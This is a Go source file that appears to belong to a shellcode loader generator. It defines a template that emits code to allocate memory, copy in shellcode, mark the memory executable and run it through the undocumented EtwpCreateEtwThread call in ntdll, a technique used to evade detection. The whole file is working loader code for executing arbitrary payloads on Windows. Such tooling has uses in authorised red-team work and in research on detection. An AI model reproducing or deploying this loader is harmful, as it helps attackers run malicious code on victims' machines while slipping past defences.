package loaders

import (
	"fmt"
	"strings"
)

type ETWPTemplate struct{}

func (t ETWPTemplate) Import() string {
	return fmt.Sprintf(`
import (
    "syscall"
    "unsafe"
)
`)
}

func (t ETWPTemplate) Const() string {
	return fmt.Sprintf(`
const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

    RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
    EtwpCreateEtwThread     = ntdll.MustFindProc("EtwpCreateEtwThread")

	VirtualAlloc            = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
    WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
)
`)
}

func (t ETWPTemplate) Init() string {
	return ""
}

func (t ETWPTemplate) Process() string {
	return fmt.Sprintf(`
/* allocating the appropriate amount of memory */
    baseAddr, _, err := VirtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ); if baseAddr == 0 {
        panic(err)
    }

    /* copying the shellcode to memory */
    _, _, _ = RtlCopyMemory.Call(
        baseAddr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    /* changing permissions for our memory segment */
    oldProtectCfg := PAGE_READWRITE
    _, _, _ = VirtualProtect.Call(
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    threadId, _, err := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
    WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
`)
}

func (t ETWPTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {
    
__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template

}
